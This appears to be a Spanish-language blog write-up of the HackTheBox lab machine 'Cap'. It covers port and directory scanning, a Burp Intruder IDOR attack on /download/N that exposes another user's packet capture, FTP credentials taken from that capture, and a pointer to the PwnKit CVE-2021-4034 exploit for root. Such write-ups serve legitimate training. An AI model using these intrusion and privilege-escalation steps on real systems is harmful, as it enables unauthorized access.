---
layout: post
title: "Cap"
date: 2024-04-05 17:04:54 +0100
tags: ["IDOR", "CVE"]
os: "Linux"
level: "Easy"
image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/70ea3357a2d090af11a0953ec8717e90.png"
---

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-15 11:13 CEST
Nmap scan report for 10.10.10.245
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Fri, 15 Aug 2025 09:13:51 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|     <SNIP>
```

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u "http://10.10.10.245/FUZZ"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.245/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

data                    [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 53ms]
ip                      [Status: 200, Size: 17452, Words: 7275, Lines: 355, Duration: 80ms]
                        [Status: 200, Size: 19386, Words: 8716, Lines: 389, Duration: 48ms]
capture                 [Status: 302, Size: 220, Words: 21, Lines: 4, Duration: 5112ms]
                        [Status: 200, Size: 19386, Words: 8716, Lines: 389, Duration: 65ms]
```

Entrar en la web y clicar en el botón "Security Snapshot...", luego en Download.

![](/assets/machines/cap.htb/images/329c78bc-b05b-4685-8c54-4fd5a48724d0.webp)

La petición que se hace es al endpoint /download/N

**Burp Suite Intruder**

Con Burp realizamos un ataque de Fuzzing.

```
GET /download/§DOWNLOAD§ HTTP/1.1
Host: 10.10.10.245
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.10.245/data/3
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache

```

El payload 1 y 2 nos pertenecen a nosotros, pero el payload 0 es de otro usuario.
![](/assets/machines/cap.htb/images/14fa71b4-0aea-463e-a848-3ef5198ff6ba.webp)

Abrimos el 0.pcap descargado con Wireshark. Se muestra una conexión FTP con credenciales validas `nathan:Buck3tH4TF0RM3!`.
![](/assets/machines/cap.htb/images/9628a135-076b-4829-9187-41abbb95cdb9.webp)

**Conexión FTP.**

```
ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:user): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

**Conexión SSH**

```
ssh nathan@10.10.10.245
```

## Escalado de Privilegios

**SUID**

```
nathan@cap:/tmp$ find / -perm /4000 -type f -exec ls -l {} \; 2>/dev/null
<SNIP>
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
```

**CVE-2021-4034**: https://github.com/ly4k/PwnKit

![](/assets/machines/cap.htb/images/17274634-0ffb-4b38-a667-15c20b357015.webp)
